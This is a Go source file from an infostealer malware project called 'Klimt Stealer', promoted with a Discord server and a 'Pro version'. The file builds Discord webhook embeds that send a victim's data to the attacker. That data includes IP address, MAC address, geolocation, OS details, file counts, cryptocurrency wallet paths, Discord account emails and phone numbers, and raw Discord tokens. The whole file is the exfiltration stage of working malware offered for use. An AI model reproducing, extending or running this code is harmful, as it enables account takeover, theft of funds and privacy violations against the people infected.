// DO NOT EDIT THIS FILE!

// This program is a simplified version with lesser functionality in comparison to the Pro version.
// See the `YHWH - Klimt Stealer` Discord for further information: https://discord.gg/GBjpS3ENGK

package main

import (
	"fmt"
	"strconv"
	"time"
)

// All external emojs used in the following embeds are stored safely in a locked server, -
// meaning that they won't just disappear one day when I stop maintaining this project.

func (stealer *Stealer) SendEmbeds() {
	// Run checks and send all embeds to the Discord webhook
	stealer.SendOverview()
	stealer.SendSystem()

	// Discord-related Embeds
	if getDiscordTokens {
		stealer.SendDiscordOverview()
		stealer.SendDiscordAccounts()
	}
}

func (stealer *Stealer) SendOverview() {
	// Overview Information Embed
	overviewEmbed := Embed{
		Title:     "Klimt Stealer <:go:1058487887148109864>",
		Color:     embedColor,
		Url:       githubUrl,
		Timestamp: time.Now(),
		Fields: []Field{
			{
				Name:   "Computer Name <:windows:1085654995501862972>",
				Value:  fmt.Sprintf("`%s`", stealer.OS.DisplayName),
				Inline: true,
			},
			{
				Name:   "IP Address <:Network_Hub:1085652951617503262>",
				Value:  fmt.Sprintf("`%s`", stealer.Network.IP),
				Inline: true,
			},
		},
		Image: Image{Url: embedGIF},
		Footer: Footer{
			Text: footerText,
		},
	}

	if getDiscordTokens {
		overviewEmbed.Fields = append(overviewEmbed.Fields, Field{
			Name:   "Discord Tokens Found <:discord:1085655557039468654>",
			Value:  fmt.Sprintf("`%d`", len(stealer.Apps.Discord.Tokens)),
			Inline: false,
		})
	}

	// Check to make sure inline embeds do not collide
	if (!getDiscordTokens) && (getNetworkConnections || getInstalledSoftware) {
		overviewEmbed.Fields = append(overviewEmbed.Fields, Field{
			Name:   "\b",
			Value:  "",
			Inline: false,
		})
	}

	if getNetworkConnections {
		overviewEmbed.Fields = append(overviewEmbed.Fields, Field{
			Name:   "Network Connections 🔌",
			Value:  fmt.Sprintf("`%d`", len(stealer.Network.NetworkConnections)),
			Inline: true,
		})
	}

	if getInstalledSoftware {
		overviewEmbed.Fields = append(overviewEmbed.Fields, Field{
			Name:   "Installed Programs <:downvote:1058523523531952209>",
			Value:  fmt.Sprintf("`%d`", len(stealer.Memory.InstalledSoftware)),
			Inline: true,
		})
	}

	if getWalletCredentials {
		overviewEmbed.Fields = append(overviewEmbed.Fields, Field{
			Name: "CryptoCurrency Wallets <:crypto:1089232985351528528>",
			Value: fmt.Sprintf("```%s```",
				FormatWalletsStolen(stealer.Apps.Wallets.Paths)),
			Inline: false,
		})
	}

	SendEmbed(overviewEmbed, true)
}

func (stealer *Stealer) SendSystem() {
	// System Information Overview Embed
	systemEmbed := Embed{
		Title:     "System Overview",
		Color:     embedColor,
		Timestamp: time.Now(),
		Fields: []Field{
			{
				Name: "<:windows:1085654995501862972> Operating System",
				Value: fmt.Sprintf("```Host:    %s\nName:    %s\nVersion: %s\nOS-ID:   %s\nConfig:  %s\nBuild:   %s\nOwner:   %s```",
					stealer.OS.ComputerName,
					stealer.OS.Name,
					stealer.OS.Version,
					stealer.OS.ProductID,
					stealer.OS.Configuration,
					stealer.OS.BuildType,
					stealer.OS.RegisteredOwner),
				Inline: false,
			},
			{
				Name: "<:network:1085654999561932830> Network",
				Value: fmt.Sprintf("```IP:      %s\nMAC:     %s\nCountry: %s \nRegion:  %s, %s\nASN:     %s\n```",
					stealer.Network.IP,
					stealer.Network.MAC,
					stealer.Network.Geo.Country,
					stealer.Network.Geo.RegionName,
					stealer.Network.Geo.City,
					stealer.Network.Geo.ASNumber),
				Inline: false,
			},
		},
		Footer: Footer{
			Text: footerText,
		},
	}

	if getScrapedFiles {
		systemEmbed.Fields = append(systemEmbed.Fields, Field{
			Name: "<:files:1085654997875838996> Files",
			Value: fmt.Sprintf("```Drive:     %d\nDesktop:   %d\nDownloads: %d\nDocuments: %d\n```",
				len(stealer.Memory.Files.Drive),
				len(stealer.Memory.Files.Desktop),
				len(stealer.Memory.Files.Downloads),
				len(stealer.Memory.Files.Documents)),
			Inline: false,
		})
	}

	systemEmbed.Fields = append(systemEmbed.Fields, Field{
		Name:   "BIOS Version",
		Value:  fmt.Sprintf("`%s`", stealer.OS.BIOS),
		Inline: false,
	})

	SendEmbed(systemEmbed, false)
}

func (stealer *Stealer) SendDiscordOverview() {
	// Discord Overview Embed
	discordEmbed := Embed{
		Title:     "Discord Overview",
		Color:     embedColor,
		Timestamp: time.Now(),
		Fields: []Field{
			{
				Name:   "<:inject:1085655002275663923> Inject into Discord",
				Value:  fmt.Sprintf("`%s`", strconv.FormatBool(injectIntoDiscord)),
				Inline: false,
			},
			{
				Name: "<:files:1085654997875838996> Token Paths",
				Value: fmt.Sprintf("```%s```",
					stealer.Apps.Discord.FormatTokensFoundPerPath(stealer.Apps.Discord.Tokens)),
				Inline: false,
			},
		},
		Footer: Footer{
			Text: footerText,
		},
	}

	SendEmbed(discordEmbed, false)
}

func (stealer *Stealer) SendDiscordAccounts() {
	// Discord Accounts Embed
	var accountEmbeds []Embed

	// Loop through each Account and format its information
	for _, account := range stealer.Apps.Discord.Accounts {
		accountEmbed := Embed{
			Title:     fmt.Sprintf("<:roles1:1085643930516856933> %s#%s (%s)", account.Username, account.Discriminator, account.ID),
			Color:     embedColor,
			Timestamp: time.Now(),
			Fields: []Field{
				{
					Name:   "<:gmail:1085659847262994534> Email:",
					Value:  fmt.Sprintf("`%s`", account.Email),
					Inline: true,
				},
				{
					Name:   "<:phone:1085660163148632227> Phone:",
					Value:  fmt.Sprintf("`%s`", account.Phone),
					Inline: true,
				},
				{
					Name:   "<:bio:1085661034074869811> Token Location:",
					Value:  fmt.Sprintf("```%s```", account.Token.Path.Name),
					Inline: false,
				},
				{
					Name:   "<a:nitroboost:996004213354139658> Nitro:",
					Value:  fmt.Sprintf("`%s`", strconv.FormatBool(account.Nitro == 1 || account.Nitro == 2)),
					Inline: true,
				},
				{
					Name:   "<:mfa:1085655004788039803> 2FA:",
					Value:  fmt.Sprintf("`%s`", strconv.FormatBool(account.MFA)),
					Inline: true,
				},
				{
					Name:   "<:earth:1085660688527134791> Language",
					Value:  fmt.Sprintf("`%s`", account.Language),
					Inline: true,
				},
				{
					Name:   "<:King:1085647666974822400> Token:",
					Value:  fmt.Sprintf("```%s```", account.Token.Token),
					Inline: false,
				},
			},
			Footer: Footer{
				Text: footerText,
			},
		}
		accountEmbeds = append(accountEmbeds, accountEmbed)
	}

	for _, accountEmbed := range accountEmbeds {
		SendEmbed(accountEmbed, false)
	}
}

var (
	webhookName = "Klimt Stealer"
	footerText  = "github.com/codeuk/klimt"
	githubUrl   = "https://github.com/codeuk/klimt"
	embedGIF    = "https://user-images.githubusercontent.com/75194878/228231029-f7ba84b1-c0cc-4472-a8dd-e09898f93912.gif"
	embedImage  = "https://upload.wikimedia.org/wikipedia/commons/thumb/7/7d/Death_and_Life_-_Gustav_Klimt.jpg/1200px-Death_and_Life_-_Gustav_Klimt.jpg"
)
